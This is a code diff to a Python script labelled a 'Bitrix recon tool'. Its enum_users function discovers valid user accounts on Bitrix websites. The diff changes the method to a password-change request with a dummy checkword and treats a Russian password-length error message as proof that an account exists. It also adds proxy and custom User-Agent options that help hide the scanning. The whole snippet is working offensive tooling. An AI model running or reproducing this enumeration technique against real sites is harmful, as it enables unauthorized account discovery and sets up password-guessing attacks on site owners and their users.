@@ -42,12 +42,13 @@ def enum_users(user_list, login_endpoints):
         time.sleep(0.5)
         payload = {
         'AUTH_FORM': 'Y',
-        'TYPE': 'SEND_PWD',
-        'USER_LOGIN': user
+        'TYPE': 'CHANGE_PWD',
+        'USER_LOGIN': user,
+        'USER_CHECKWORD': '1'
         }
-        url = f"{login_endpoint}?forgot_password=yes"
+        url = f"{login_endpoint}?change_password=yes"
         response = requests.post(url, data=payload)
-        if "Контрольная строка, а также ваши регистрационные данные были высланы на email." in response.text:
+        if "Пароль должен  быть не менее 6 символов длиной." in response.text:
             valid_users.append(user)
 
     return valid_users
@@ -56,6 +57,8 @@ def enum_users(user_list, login_endpoints):
 def main():
     parser = argparse.ArgumentParser(description="Bitrix recon tool")
     parser.add_argument("-t", "--target", required=True, help="Base URL of the Bitrix website")
+    parser.add_argument("-p", "--proxy", required=False, help="Proxy server")
+    parser.add_argument("-u", "--user-agent", required=False, help="Use specific User-Agent")
     args = parser.parse_args()
     
     base_url = args.target
